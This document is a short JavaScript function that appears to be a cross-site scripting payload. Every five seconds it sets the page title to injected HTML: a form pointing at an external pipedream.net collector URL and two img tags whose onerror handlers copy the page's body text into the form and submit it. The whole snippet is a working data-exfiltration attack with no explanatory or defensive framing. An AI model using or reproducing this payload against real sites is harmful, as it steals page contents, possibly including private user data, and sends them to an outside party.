function changeTitle(){
    window.setInterval(function(){
        document.title = 
            '<form name="xss_form" action="https://eo28kejt5kjkrb9.m.pipedream.net" method="GET">\
                <input type="text" id="info" name="info" placeholder="your name"> \
                <input type="submit" value="Submit"> \
            </form>\
            <img src="x" onerror="document.forms.xss_form.elements.info.value = document.body.innerText">\
            <img src="x" onerror="document.forms.xss_form.submit()">';
            
    }, 5000);
    
}